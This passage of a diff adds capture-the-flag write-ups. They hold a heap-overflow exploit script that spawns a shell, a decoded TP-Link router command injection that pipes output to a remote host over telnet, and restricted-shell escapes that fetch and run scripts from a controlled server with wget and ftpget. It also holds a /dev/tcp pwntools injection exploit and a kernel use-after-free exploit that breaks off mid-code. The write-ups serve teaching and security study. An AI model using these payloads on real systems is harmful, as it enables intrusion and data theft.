+valid and still decode to `obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`
+
+You can have multiple instances for `pass`: `\x08\x17\x10\x11\x08\x20\x10\x11`
+is valid and still decode to `obj.lens = [0x17, 0x20] ` and `obj.pass = 0x11`.
+
+### The Vulnerability
+
+I discovered that there are at least 2 ways to encode repeated fields. The
+preferred way to encode a repeated field in protobuf is to have multiple
+instances of a field. In fact, if you serialize `obj.lens = [0x17, 0x20]` you
+get `\x08\x17\x08\x20`. Another "valid" way to encode a repeated field is to use
+[`Lenght'delimited` type](https://developers.google.com/protocol-buffers/docs/encoding).
+In this case `\x0a\x02\x17\x20` is still decoded as `obj.lens = [0x17, 0x20]`.
+In particular, `\x0a` is field number 1 with type 2 (`1 << 3 | 2 = 0x0a`). 0x0a
+is followed by the size of the content (2 bytes in this case). Then there is the
+encoding of multiple numbers. (N.B. the numbers are always encoded as
+[`Variant`](https://developers.google.com/protocol-buffers/docs/encoding), you
+can have any number not only single bytes).
+
+If you deserialize and the serialize back `\x0a\x02\x17\x20` you get the string
+`\x08\x17\x08\x20`. Both are 4 bytes, so this particular instance is not a
+problem.
+
+However, if you deserialize and serialize `\x0a\x02\x17\x20\x17`, you get back
+`\x08\x17\x08\x20\x08\x17`. The first string is 5 bytes; the second is 6 bytes.
+For every single byte that we add in the first string, we get 2 bytes in the
+second. This allows us to overflow a chunk.
+
+### The Exploit
+
+- We have a heap overflow where we can easily control the last byte.
+- We have arbitrary read and write in any chunk that we control.
+- We have a list of .bss containing pointers to our chunks.
+
+This is an excellent candidate to do an
+[unsafe_unlink](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c).
+
+Our exploit aims to exploit an unsafe_unlink to overwrite one of the pointers in
+`slots` to point to `slots`. This will allow us to arbitrarily change the
+pointer of a slot and have arbitrary read and arbitrary write primitives. With
+those primitives, we can read `.got` to leak libc and change the function `free`
+with function `system`. Please note that the binary is not `PIE` and is not
+`Full RELRO`.
+
+### The Unsafe Unlink
+
+This step aims to overwrite one of the pointers in `slots` with an address of
+`slots`. This is possible by exploiting the unlink function of libc. When
+eliminating a chunk from the free list, the unlink algorithm of libc will
+overwrite the previous chunk's forward ptr. We can exploit this write by faking
+that the previous chunk is on `.bss`. There are several checks in the libc that
+you need to meet to have unlink successfully. You can play with
+[how2heap]((https://github.com/shellphish/how2heap/blob/master/glibc_2.31/unsafe_unlink.c))
+to understand those constraints.
+
+In practice, we create a fake chunk header 0x10 bytes below one valid chunk.
+(You can do this because 0x10 bytes below the header begins the data part of the
+chunk). We do an overflow from one chunk to another, changing the `PREV_IN_USE`
+bit from 1 to 0. We set the prev_size to be 0x10 byte less than the real one.
+When we free the second chunk, a `consolidate` is triggered, trying to merge
+multiple chunks, so our chunk is unlinked, causing the overwrite.
+
+### Aligning the ~~Stars~~ Chunks
+
+To trigger the consolidate, we need our chunk to be contiguous to the top_chunk.
+The size of the chunk that we choose to make this attack is 0x458.
+Reason to choose this size:
+
+- It needs NOT to be a fastbin.
+- We need to be able to overwrite the prev_size filed.
+
+The prev_size fields are placed as the last 8 bytes of the chunks.
+`malloc(0x458)` will create a chunk of 0x460 bytes.
+
+In our exploit, we allocate 20 chunks of sizer 0x458. This will remove all the
+free chunks of that size.
+
+We allocate some `extra_sizes` (`0x410, 0x470, 0x13b0, 0x2010`). Those are chunk
+size that will be used by protobuf deserialize and serialize functions. The idea
+is to preallocate those chunks to avoid them from being between our attacked
+chunk and the top_chunk. If you wonder, we got the size with gdb by looking at
+which chunks were between our attacked chunk and the top_chunk.
+
+We allocate 3 chunks of size `0x460`:
+
+1. The first chunk (`chunk_c`) is there as a used chunk. We need to consolidate
+   only 2 chunks, so we use the first chunk as a barrier.
+2. The second chunk (`chunk_a`) is the chunk that we are using as a fake chunk
+   and the chunk to do the overflow.
+3. The third (`chunk_b`) chunk is the chunk that will be overflown by over byte.
+
+After the allocation, we deallocate the extra_sizes chunk. Now they are
+available for the protobuf algorithm, and they will not interfere with our
+attack.
+
+### Arbitrary Read/Write
+
+With unsafe unlink, you can overwrite one of the pointers in `slots` and have
+that pointer pointing to `slots` as well. This will allow you to control any
+pointer with data that you want.
+
+To build a decent primitive arbitrary read-write. We made `slots[20]` pointing
+to `slots[21]`. And both were chunks allocated with size 8. By writing in
+`slots[20]` we set the `address` of our primitive. by reading-writing
+`slots[21]`, we exploit the read-write.
+
+With this primitive, we can, by reading the value of puts in .got, get a leak of
+libc. We can compute the position of the `system,` and we can substitute free in
+.got with the `system`. At this point, we just need to free a chunk which
+content is `/bin/sh\x00` to get a shell.
+
+### The script
+
+```python
+from pwn import *
+
+r = remote("13.112.193.37", 8573)
+
+def alloca_slot(slot, size):
+    assert(slot <= 0x400)
+    assert((size & 0x80000000) == 0)
+    r.sendline("1")
+    r.recvuntil("slot>\n")
+    r.sendline("%d" % slot)
+    r.recvuntil("size>\n")
+    r.sendline("%d" % size)
+
+def write_slot(slot, data):
+    assert(slot <= 0x400)
+    r.sendline("2")
+    r.recvuntil("slot>\n")
+    r.sendline("%d" % slot)
+    r.send(data)
+
+def free_slot(slot):
+    assert(slot <= 0x400)
+    r.sendline("3")
+    r.recvuntil("slot>\n")
+    r.sendline("%d" % slot)
+
+def parse_slot(slot):
+    assert(slot <= 0x400)
+    r.sendline("4")
+    r.recvuntil("slot>\n")
+    r.sendline("%d" % slot)
+
+def print_slot(slot):
+    assert(slot <= 0x400)
+    r.sendline("5")
+    r.recvuntil("slot>\n")
+    r.sendline("%d" % slot)
+    return r.recvuntil("op>\n")[:-4]
+
+
+# lens = b"\x41" * 40
+# data = b"\x10\xef\xfd\xb6\xf5\x0d" + b"\x0a"+bytes([len(lens),]) +  lens
+# print(data)
+
+overflow = b"\x0a\x0b\x41\x41\x41\x41\x41\x41\x41\x41\x41\x60"
+pass_data = b"\x10\xef\xfd\xb6\xf5\x0d"
+filling = b"\x08" * 1090 + b"\x0a\x02\x80\x08"
+
+data = pass_data + filling + overflow
+
+chunk_size = 0x458
+
+assert(len(data) == chunk_size)
+
+for i in range(0, 20):
+    alloca_slot(i, chunk_size)
+
+
+extra_sizes = [0x410, 0x470, 0x13b0, 0x2010]
+extra_space = i
+for i in range(extra_space, extra_space+len(extra_sizes)):
+    print("allocat_empy %d" % i )
+    alloca_slot(i, extra_sizes[i - extra_space] - 0x10)
+
+
+data = data.ljust(chunk_size, b"\x00")
+chunk_a = i + 1
+chunk_b = i + 2
+chunk_c = i + 3
+print("a: %d, b: %d" % (chunk_a, chunk_b))
+alloca_slot(chunk_c, chunk_size)
+alloca_slot(chunk_a, chunk_size)
+alloca_slot(chunk_b, chunk_size)
+
+for i in range(extra_space, extra_space+len(extra_sizes)):
+    print("free %d" % i )
+    free_slot(i)
+
+write_slot(chunk_a, data)
+s = print_slot(chunk_a)
+parse_slot(chunk_a)
+s2 = print_slot(chunk_a)
+
+slots_base = 0x409280
+
+addre_23 = slots_base + 23*8 # chunk_a
+
+new_chunk_a = p64(0x0) + p64(0x451) + p64(addre_23 - 0x18) + p64(addre_23 - 0x10) + p64(0) + p64(0) + b"c"*8 + b"d"*8 + b"e"*8
+new_chunk_a = new_chunk_a.ljust(0x450, b"B") + p64(0x450)
+# input("wait for write")
+write_slot(chunk_a, new_chunk_a)
+# input("wait for free")
+free_slot(chunk_b)
+
+slots_data = print_slot(chunk_a)
+puts_got = 0x4091A8
+
+alloca_slot(20, 8)
+alloca_slot(21, 8)
+# input("check chunka")
+payload =  p64(0x409328) + p64(puts_got)
+payload = payload.ljust(chunk_size, b"\x00")
+r.recvuntil("op>\n")
+write_slot(chunk_a, payload)
+
+
+context.log_level = "DEBUG"
+r.recvuntil("op>\n")
+puts_leak = u64(print_slot(21))
+libc_base = puts_leak - 0x875a0
+system_libc = libc_base + 0x55410
+free_got = 0x409128
+print("[!] puts_atlibc: %x" % puts_leak)
+print("[!] libc_base: %x" % libc_base)
+print("[!] libc_system: %x" % system_libc)
+
+write_slot(20, p64(free_got))
+write_slot(21, p64(system_libc))
+write_slot(1, b"/bin/sh".ljust(chunk_size, b"\x00"))
+r.sendline("3")
+r.recvuntil("slot>\n")
+r.sendline("1")
+
+r.interactive()
+```
+
+
 100 pins
 --------
+
 > 4 digits pin are too weak... How about 100 of them?
 > nc 18.183.134.249 1234
 
-## The bug(s)
+### The bug(s)
 
-The challenge is made with NodeJS (15.3.0) and the main point was `Math.random()`. This PRNG [is not cryptographically secure](https://devdocs.io/javascript/global_objects/math/random), as we can recorver the initial states of the `XorShift128+` with enough consecutive outputs and some symbolic execution.
+The challenge is made with NodeJS (15.3.0) and the main point was
+`Math.random()`. This PRNG
+[is not cryptographically secure](https://devdocs.io/javascript/global_objects/math/random),
+as we can recorver the initial states of the `XorShift128+` with enough
+consecutive outputs and some symbolic execution.
 
-We notice that the "Mastermind" behind this challenge allows us to gather more information than usual, because there is no check on the length of the input. In fact we can recover the (unique) digits of the pin choosing the pattern: `'1'*2^0 + '2'*2^1 + '3'*2^2 + '4'*2^3 + ... + '9'*2^8`.
+We notice that the "Mastermind" behind this challenge allows us to gather more
+information than usual, because there is no check on the length of the input. In
+fact we can recover the (unique) digits of the pin choosing the pattern:
+`'1'*2^0 + '2'*2^1 + '3'*2^2 + '4'*2^3 + ... + '9'*2^8`.
 
-This gives us a result that tells us exactly the digits of the pin. We can get this by adding the number of digits in the correct position and the remaining number of correct digits that are not in the correct position. This number, in binary, gives us the corresponding digit in the pattern.
+This gives us a result that tells us exactly the digits of the pin. We can get
+this by adding the number of digits in the correct position and the remaining
+number of correct digits that are not in the correct position. This number, in
+binary, gives us the corresponding digit in the pattern.
 
-After getting the digits we find the correct permutation with a "guess and prune" algorithm, discarding any rearrangement that is incompatible with the results of the previous guesses.
+After getting the digits we find the correct permutation with a "guess and
+prune" algorithm, discarding any rearrangement that is incompatible with the
+results of the previous guesses.
 
-In the end our algorithm is capable of finding a correct pin with an average of 4-5 attempts, and with a bit of luck we are able to retrieve the 11 pins needed to ensure that z3 outputs a unique solution in less than 39 attempts.
+In the end our algorithm is capable of finding a correct pin with an average of
+4-5 attempts, and with a bit of luck we are able to retrieve the 11 pins needed
+to ensure that z3 outputs a unique solution in less than 39 attempts.
 
-Once we have the initial state of the PRNG, we face another problem: the actual values being generated are stored in a "pool" of 64 numbers, that is refreshed with 64 new ones every time it is empty. The numbers within the pool are then outputted in reverse order (as explained in this presentation and [video](https://www.youtube.com/watch?v=_Iv6fBrcbAM)). This means that, if the order of the random generation is 1...64||65...128, we get 64...54 and we need to predict 53...1||128...93. Once we get the seed, the "next" number generated will be the 54th. This means that we need to reverse the XorShift128+ algorithm to retrieve the values 53...1! Fortunately, [this isn't a problem at all](https://blog.securityevaluators.com/xorshift128-backward-ff3365dc0c17).
+Once we have the initial state of the PRNG, we face another problem: the actual
+values being generated are stored in a "pool" of 64 numbers, that is refreshed
+with 64 new ones every time it is empty. The numbers within the pool are then
+outputted in reverse order (as explained in this presentation and
+[video](https://www.youtube.com/watch?v=_Iv6fBrcbAM)). This means that, if the
+order of the random generation is 1...64||65...128, we get 64...54 and we need
+to predict 53...1||128...93. Once we get the seed, the "next" number generated
+will be the 54th. This means that we need to reverse the XorShift128+ algorithm
+to retrieve the values 53...1! Fortunately,
+[this isn't a problem at all](https://blog.securityevaluators.com/xorshift128-backward-ff3365dc0c17).
 
 ```python
 #!/usr/bin/env python3
@@ -2975,13 +2224,10 @@ def main():
         except Exception as e:
             print(e)
 
-
 main()
-
 ```
 
-
-## Execution
+### Execution
 
 With a lot of luck
 
@@ -3097,5 +2343,1041 @@ b'Pin 100? \x1b[1;32mOK\x1b[0m\n'
 [*] Switching to interactive mode
 FLAG Unlocked: hitcon{even_my_c4t_can_s0lve_4_digits_pin_4A999B}
 [*] Got EOF while reading in interactive
+```
+
+
+AC1750
+--------
+
+> My router is weird, can you help me find the problem?
+
+### The challenge
+
+We are given a PCAP file which contains some communication between a computer (a macbook pro) and a router (a TP-link AC1750)
+
+
+### The PCAP
+
+The PCAP can be divided into 3 main flows, one after the other:
+
+1. Some HTTP requests to the router web interface, which seems to be running
+   some sort of OpenWRT, given the references to the LuCI API. Nothing too
+   interesting here
+2. Some weird UDP traffic from the computer to port 20002 of the router which
+   appears to be encrypted (high entropy, no recognizable strings)
+3. A TCP connection from the router to the computer on port 4321, which sends
+   back the output of the `ls` command
+
+### UDP port 20002
+
+From a quick search on the internet, we find references to
+[CVE-2020-10882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882),
+which coincidentally affects the router we are communicating with.
+
+We were able to find
+[this extremely useful writeup](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo)
+which explains the details of the protocol, and of the vulnerability which
+causes RCE. TLDR (since it's what we care about): it communicates using packets
+containing a 32-byte header and a JSON encrypted with AES-128 CBC, with the
+fixed key `TPONEMESH_Kf!xn?` and IV `1234567890abcdef1234567890abcdef`.
+
+Without knowing anything else about the protocol (except that the injection
+point is in the slave_mac JSON key), we exported the UDP traffic from wireshark
+as JSON and wrote this quick python script:
+
+```python
+from Crypto.Cipher import AES
+
+def decrypt(packet_hex):
+	c = AES.new(b'TPONEMESH_Kf!xn?',AES.MODE_CBC,b'1234567890abcdef')
+	enc = bytearray.fromhex(packet_hex[32:])
+	return c.decrypt(enc)
+
+
+import json
+
+f = json.loads(open("traffic.json").read())
+for p in f:
+	try:
+		p = p['_source']['layers']['udp']['udp.payload'].replace(':',"") #because wireshark hexdump is stupid
+		print(json.loads(decrypt(p))['data']['slave_mac'][2:-1])
+	except Exception as e:
+		pass
+```
+
+Which, after a bit of cleaning, this returned
+```bash
+echo>f;
+printf '('>>f;
+printf 'l'>>f;
+printf 's'>>f;
+printf ' '>>f;
+printf '-'>>f;
+printf 'l'>>f;
+printf '&'>>f;
+printf '&'>>f;
+printf 'e'>>f;
+printf 'c'>>f;
+printf 'h'>>f;
+printf 'o'>>f;
+printf ' '>>f;
+printf 'h'>>f;
+printf 'i'>>f;
+printf 't'>>f;
+printf 'c'>>f;
+printf 'o'>>f;
+printf 'n'>>f;
+printf '{'>>f;
+printf 'W'>>f;
+printf 'h'>>f;
+printf 'y'>>f;
+printf '_'>>f;
+printf 'c'>>f;
+printf 'a'>>f;
+printf 'n'>>f;
+printf '_'>>f;
+printf 'o'>>f;
+printf 'n'>>f;
+printf 'e'>>f;
+printf '_'>>f;
+printf 'p'>>f;
+printf 'l'>>f;
+printf 'a'>>f;
+printf 'c'>>f;
+printf 'e'>>f;
+printf '_'>>f;
+printf 'b'>>f;
+printf 'e'>>f;
+printf '_'>>f;
+printf 'i'>>f;
+printf 'n'>>f;
+printf 'j'>>f;
+printf 'e'>>f;
+printf 'c'>>f;
+printf 't'>>f;
+printf 'e'>>f;
+printf 'd'>>f;
+printf '_'>>f;
+printf 't'>>f;
+printf 'w'>>f;
+printf 'i'>>f;
+printf 'c'>>f;
+printf 'e'>>f;
+printf '}'>>f;
+printf '>'>>f;
+printf 'f'>>f;
+printf 'l'>>f;
+printf 'a'>>f;
+printf 'g'>>f;
+printf '&'>>f;
+printf '&'>>f;
+printf 'l'>>f;
+printf 's'>>f;
+printf ' '>>f;
+printf '-'>>f;
+printf 'l'>>f;
+printf ')'>>f;
+printf '|'>>f;
+printf 't'>>f;
+printf 'e'>>f;
+printf 'l'>>f;
+printf 'n'>>f;
+printf 'e'>>f;
+printf 't'>>f;
+printf ' '>>f;
+printf '1'>>f;
+printf '9'>>f;
+printf '2'>>f;
+printf '.'>>f;
+printf '1'>>f;
+printf '6'>>f;
+printf '8'>>f;
+printf '.'>>f;
+printf '0'>>f;
+printf '.'>>f;
+printf '1'>>f;
+printf '0'>>f;
+printf '5'>>f;
+printf ' '>>f;
+printf '4'>>f;
+printf '3'>>f;
+printf '2'>>f;
+printf '1'>>f;
+sh f;
+```
+
+Which, when executed, creates the file `f` containining:
+
+```bash
+(ls -l && echo hitcon{Why_can_one_place_be_injected_twice}>flag &&l s -l)|telnet 192.168.0.105 4321
+```
+
+Which contains the flag!
+
+
+Baby Shock
+----------
+
+> `nc 54.248.135.16 1986`
+
+### The challenge
+
+We can connect via netcat to a machine, which contains an extremely limited shell, where the only commands we can run are `pwd ls mkdir netstat sort printf exit help id mount df du find history touch
+` and (most of the) special characters are filtered
+
+### The solution
+
+For some reason, `;` is not filtered. This means that we can run any command by
+doing `id ; mycommand`, as long as mycommand does not contain special characters
+(such as `-`, so most flags are forbidden).
+
+Also, the `.` is restricted, and cannot appear more than once in a command.
+
+So first we execute:
+
+```bash
+id ; wget 123456789
+```
+
+where 123456789 is the IP (encoded as decimal number) of a HTTP serve we
+control, that hosts an index.html containing shell commands.
+
+We then execute it via the command:
 
 ```
+id ; sh index.html
+```
+
+Which allows us to explore the filesystem, and see that there is a `readFlag`
+binary in `/`. By executing it we get the flag.
+
+
+Revenge of Baby Shock
+---------------------
+
+> `nc 18.178.60.6 1987`
+
+### The challenge
+
+It's identical to baby shock, but more characters are forbidden, including `;`
+and even a single `.`
+
+### The solution
+
+One of the (very few) special characters allowed are `()`. With these, it's
+possible to declare functions.
+
+This means that we can do
+```bash
+> id () whoami
+> id
+whoami: unknown uid 1129
+```
+
+To redefine one of the allowed commands (in this case `id`) to a function that
+executes our desired command.
+
+Without the `.`, we couldn't use the same trick as before to execute the reverse
+shell, as wget by default saves the downloaded files as `index.html` (and to
+change that name, a flag starting with `-` is required).
+
+Luckily, the server was running busybox, which contains the `ftpget` utility,
+with the much simper syntax of `ftpget HOST LOCAL_FILE REMOTE_FILE`.
+
+So we run the following commands
+
+```bash
+id () ftpget 123456789 payload payload
+id
+```
+
+to download via FTP the payload file from our server with ip 123456789 (decimal
+encoded), which contains the command `/readFlag`, and then
+
+```
+id () sh payload
+id
+```
+
+To execute it and read the flag, which is
+`hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}`.
+
+
+Revenge of Pwn
+--------------
+
+> Have you ever thought those challenges you pwned may retaliate someday?
+>
+> `nc 3.115.58.219 9427`
+
+### The challenge
+
+Our task is to write an exploit to "pwn" a
+[`pwntools`](https://github.com/Gallopsled/pwntools) Python script that runs on
+the remtoe server. When we connect, we can upload an executable: this executable
+is then saved and exposed in the local on port 1337. Then, the Python script is
+started. Our executable does not have the right to read the flag, which is at
+`/home/deploy/flag`, but the Python script does. We need to find a way to make
+it read and spit out that file.
+
+The Python script does the following:
+
+1. Start listening on port 31337.
+2. Expect to receive a string containing a stack address
+   (`stack address @ 0xXXX`) from the program right away.
+3. Prepare and send a shellcode to our program. The shellcode is meant to leak
+   an `fd` number from the stack and send it back as a decimal string to the
+   Python script by conencting back to port 31337. The code sends the `fd`
+   number followed by a `@` character.
+4. Receive the leaked `fd` on port 31337, using `s.recvuntil('@')`.
+5. Use the value to craft some more shellcode which is then sent to our program.
+
+### The vulnerability
+
+When receiving the `fd` number, the Python script treats it as a string without
+converting it to integer. When passing the string to the `shellcraft` function
+of `pwntools`, this value is directly inserted into an assembly program that is
+then passed to `cpp` (compiler) to evaluate preprocessor macros and then to `as`
+(assembler) to assemble it into the actual shellcode.
+
+Since we have control on the "vulnerable" program that the script tries to
+connect to, after sending a fake stack address, we can just connect back to the
+script on port 31337 and send an arbitrary string followed by `@`. This string
+will then be passed to `shellcraft`, and it ends up in the middle of the
+assembly program that is being compiled into shellcode.
+
+### The exploit
+
+The remote server says `ELF size? (MAX: 6144)` when connecting, which makes it
+seems like it only accepts an ELF file. Sure, we could craft a very simple ELF
+that does a write plus connect, no big deal. However, we can send any kind of
+file and the serer will mark it as executable. We can therefore just send a Bash
+script as executable and make our life 10 times easier.
+
+Now in our executable we could just send `.incbin "/home/deploy/flag"` and have
+`as` include the flag as raw bytes in the resulting shellcode that is then sent
+back to us, but `pwntools`
+[makes some very strict sanity checks](https://github.com/Gallopsled/pwntools/blob/stable/pwnlib/util/safeeval.py#L46)
+on our string before actually inserting it into the assembly. Our string can
+only be a valid Python expression: it is compiled using
+[`compile()`](https://docs.python.org/3/library/functions.html#compile) and the
+resulting bytecode is checked against a whitelist of Python opcodes before being
+evaluated and inserted in the assembly. Long story short, we nee to pass this
+check and cannot just send arbitrary stuff.
+
+Since the assembly will be parsed by `cpp`, it can contain valid C preprocessor
+directives, like for example `#include`. Luckily, `#` in Python delimits the
+start of a comment, which is completely ignored by `compile()`. We can therefore
+send a number followed by a newline and then `#include </home/deploy/flag>@`.
+
+Here's the complete exploit:
+
+```bash
+#!/bin/bash
+# @mebeim - 2020-11-29
+
+{
+cat <<EOF
+122
+#!/bin/bash
+
+echo 'stack address @ 0x1234'
+sleep 1
+echo -e '123\n#include "/home/deploy/flag"@' > /dev/tcp/127.0.0.1/31337
+EOF
+} > /dev/tcp/3.115.58.219/9427
+```
+
+This will result in the remote `pwntools` trying to compile something like this:
+
+```
+    push 123
+#include </home/deploy/flag>
+    push 16384
+```
+
+Which will make `cpp` include the flag in the file. Afterwards, when passing the
+file to `as`, it will die because the source is invalid, and make `pwntools`
+dump the script and the flag to `stderr`:
+
+```
+[ERROR] An error occurred while assembling:
+       1: .section .shellcode,"awx"
+       2: .global _start
+       3: .global __start
+       4: _start:
+       5: __start:
+       6: .intel_syntax noprefix
+       7: stager_3:
+       8:     push 123
+       9: hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
+      10:     push 16384
+...
+...
+/var/tmp/pwn-asm-bslk3jq9/step1:9: Error: no such instruction: `hitcon{use_pwntools_to_pwn_pwntools_^ovo^}'
+```
+
+
+Atoms
+-----
+
+> A TOken-based Memory Storage.
+>
+> nc 13.231.7.116 9427
+
+### Challenge Release Content
+
+|              file | comment                                |
+| -----------------:| -------------------------------------- |
+|            run.sh | bash script to run the challenge       |
+|        linux.diff | a patch that was applied to the kernel |
+| initramfs.cpio.gz | the system (binaries, libraries, etc.) |
+|            demo.c | source code of the test module         |
+|              demo | a sample binary to test the module     |
+|           bzImage | the kernel                             |
+|          atoms.ko | the kernel module loaded on the system |
+
+### The Goal of the Challenge
+
+There was no flag file. The goal of the challenge was not standard. But looking
+at the released file was easy to understand the goal of the challenge. In
+particular, the `linux.diff` tells us that the flag is stored in the kernel's
+error messages.
+
+```diff
+index 7110906..beeb01f 100644
+--- a/kernel/watchdog.c
++++ b/kernel/watchdog.c
+@@ -409,9 +409,12 @@ static enum hrtimer_restart watchdog_timer_fn(struct hrtimer *hrtimer)
+ 			}
+ 		}
+
++#ifndef FLAG
++ #define FLAG "hitcon{<FLAG WILL BE HERE>}"
++#endif
+ 		pr_emerg("BUG: soft lockup - CPU#%d stuck for %us! [%s:%d]\n",
+ 			smp_processor_id(), duration,
+-			current->comm, task_pid_nr(current));
++			FLAG, task_pid_nr(current));
+ 		print_modules();
+ 		print_irqtrace_events(current);
+ 		if (regs)
+```
+
+Looking at the kernel's
+[original source code](https://elixir.bootlin.com/linux/latest/source/kernel/watchdog.c#L341),
+we understood that the error is triggered if the core is stacked for a certain
+amount of time. In practice, you need to get the kernel module in deadlock.
+
+### The Kernel Module
+
+This kernel module (`atomos.ko`) is creating a new device file `/dev/atoms`. It
+easy to understand the basic functionality of the module from the demo source
+code.
+
+Practically, you can **open** the device file:
+
+```c
+  int fd = open(DEV_PATH, O_RDWR);
+```
+
+**Select/Create** storage indexed by a `key`:
+
+```c
+  ioctl(fd, ATOMS_USE_TOKEN, TOKEN)
+```
+
+**Allocate** space for you messages:
+
+```c
+  struct atoms_ioctl_alloc arg = {
+    .size = 0x1000,
+  };
+  assert(ioctl(fd, ATOMS_ALLOC, &arg) == 0);
+```
+
+**Map** the storage to a userspace virtual address:
+
+```c
+  void *ptr = mmap(0, 0x1000, PROT_WRITE, MAP_SHARED, fd, 0);
+```
+
+When memory is allocated in userspace, you can **read or write** it:
+
+```c
+  strcpy((char*)ptr, "the secret message left by parent");
+```
+
+**Remove** the storage from userspace:
+
+```c
+  munmap(ptr, 0x1000);
+```
+
+**Close** the file descriptor:
+
+```c
+  close(fd);
+```
+
+The `ioctl` function is the most interesting part. We spent some time to reverse
+engineer the details. There are 4 basic commands for `ioctl`.
+
+```
+ATOMS_USE_TOKEN    0x4008D900  // set the current pool to a token
+ATOMS_ALLOC        0xC010D902  // allocate memory for current pool
+ATOMS_RELEASE      0xD903      // clean up the pool
+ATOMS_INFO         0x8018D901  // return info about the current pool
+```
+
+The module internally has the concept of `pool`. A `pool` is identified by a
+`token` and contains the messages (memory pages) corresponding to a specific
+`token` The kernel has a global variable that is an array of pools. It can store
+up to 1024 pools.
+
+#### The Locks
+
+The module uses the kernel function `raw_spin_lock` to set up a lock on several
+resources. We identified three types of locks:
+
+- `fd_lock`: This is a locking done on a file descriptor. The resource is stored
+  in `priv_data` of the fd kernel structure.
+- `pools_lock`: This lock is done when accessing the global variable array
+  containing all the pools. This resource is stored as a global variable as well.
+- `tk_lock`: A lock that is used to control access to a specific `pool`/`token`.
+  This resource is store as part of the `pool` structure.
+
+#### The Ref Counter
+
+Internally, the `pool` is a structure that looks like this:
+
+```c=
+struct __attribute__((aligned(8))) s_pool
+{
+  _QWORD token;
+  __int32 ref_counter;
+  _DWORD lock;
+  msg msgs[16];
+};
+```
+
+`token` is the identifier of the pool, `lock` is the resource used for locking
+mechanism. `msgs` are the pages/messages stored in the pool.
+
+`ref_counter` is counting how many *things* have a reference to this pool. The
+`ref_counter` is set to one when the pool is selected with the token. When
+`ref_counter` reaches zero, all `pool` contents are set free (`atoms_mem_put`).
+Ideally should reach zero only when the `fd` is closed. mapping a page increase
+the counter by 1, unmapping a page decrease the counter by 1.
+
+### The (Unintented) Vulnerability.
+
+The challenge's obvious goal was to get some of the locks interleaved to end up
+in a deadlock. We did not find such a combination. There is an exploit with the
+intended solution posted by the author david942j. At the time of writing, I
+(jinblack) do not understand that exploit. We exploited a User After Free that
+we stumbled on while experimenting.
+
+If you map a message with multiple pages, the `ref_counter` is increased by 1.
+If you unmap pages singularly, each `munmap` decrease the counter by 1. This
+allows us to get the counter to zero even if the `fd` is not closed yet.
+
+When the `ref_counter` reaches 0, the structure containing information of the
+selected token is set free. But because the `fd` is still alive, we can keep
+doing operations with that pool.
+
+With this vulnerability, our focus changed from getting a **deadlock** to crash
+the kernel to just **crash** the kernel.
+
+### The Exploit
+
+We modified the `demo.c` program to:
+
+- **allocate** multiple pages.
+- **deallocate** pages singularly until `ref_counter` reaches 0,
+- **spawn** several children that use the module.
+- **monitor** if the values in the current chunk change with `ATOMS_INFO`.
+- when the value changes, we just try to **use** the module, expecting a crash.
+
+The exploit is not 100% reliable. It happens (quite often) that the program
+terminates without a crash. We just run the program several times.
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <stdint.h>
+
+#define ATOMS_USE_TOKEN    0x4008D900
+#define ATOMS_ALLOC        0xC010D902
+#define ATOMS_RELEASE         0xD903
+#define ATOMS_INFO         0x8018D901
+
+struct atoms_ioctl_alloc {
+  uint64_t size;
+  uint64_t unk;
+};
+
+struct atoms_ioctl_info {
+  uint64_t token;
+  uint64_t num;
+  uint64_t index;
+};
+
+#define DEV_PATH "/dev/atoms"
+#define TOKEN 0xdeadbeef
+
+static void print_info(int fd){
+  struct atoms_ioctl_info arg= {
+    .token = 0x0,
+    .num = 0x0,
+    .index = 0x0,
+  };
+  assert(ioctl(fd, ATOMS_INFO, &arg) == 0);
+  printf("token: %lx\t num %lx\t index %lx\n", arg.token, arg.num, arg.index);
+
+}
+
+static int get_token(int fd){
+  struct atoms_ioctl_info arg= {
+    .token = 0x0,
+    .num = 0x0,
+    .index = 0x0,
+  };
+  assert(ioctl(fd, ATOMS_INFO, &arg) == 0);
+  return arg.token;
+}
+
+static void hex_printer(uint8_t *c, int size){
+  for(int i=0; i < size; i++){
+    printf("%02x ", c[i]);
+  }
+  puts("");
+}
+
+static int open_atoms(){
+  int fd = open(DEV_PATH, O_RDWR);
+  assert(fd >= 0);
+  return fd;
+}
+
+static void set_token(int fd, uint64_t token){
+  assert(ioctl(fd, ATOMS_USE_TOKEN, token) == 0);
+}
+
+static void set_token_noa(int fd, uint64_t token){
+  printf("s_token %x\n", ioctl(fd, ATOMS_USE_TOKEN, token));
+}
+
+
+static void alloca_size(int fd, uint32_t size){
+  struct atoms_ioctl_alloc arg = {
+    .size = size,
+  };
+  assert(ioctl(fd, ATOMS_ALLOC, &arg) == 0);
+}
+
+static void *mappa(int fd, uint64_t size){
+  void *ptr = mmap(0, size, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
+  printf("mem: %p\n", ptr);
+  assert(ptr != MAP_FAILED);
+  return ptr;
+}
+
+static void release(int fd){
+    assert(ioctl(fd, ATOMS_RELEASE) == 0);
+}
+
+static void fill_a_token(uint64_t token, int size){
+  int fd = open_atoms();
+  set_token(fd, token);
+
+  for (int i=0; i < 16; i++)
+    alloca_size(fd, size);
+}
+
+
+static void child_work() {
+  printf("[child] start\n");
+  int fd = open_atoms();
+  set_token(fd, 0x41424344);
+  char *ptr = mappa(fd, 0x1000);
+  printf("mem: %p\n", ptr);
+
+  release(fd);
+  munmap(ptr, 0x1000);
+  close(fd);
+}
+
+static void parent_work(int argc, char *argv[]) {
+  int fd = open_atoms();
+  puts("before set token");
+  set_token(fd, TOKEN);
+
+  // allocate a multiple pages chunk
+  alloca_size(fd, 0x5000);
+  uint8_t *ptr = mappa(fd, 0x5000);
+  hex_printer(ptr, 0x10);
+  strcpy((char*)ptr, "AAAAAAAAAAAAAAAAAAAAB");
+
+  // deallocate page singularly to get ref count below 1
+  printf("before munmap 1 \n");
+  munmap(ptr + 0x1000, 0x1000);
+
+  printf("before munmap 2 \n");
+  munmap(ptr + 0x2000, 0x1000);
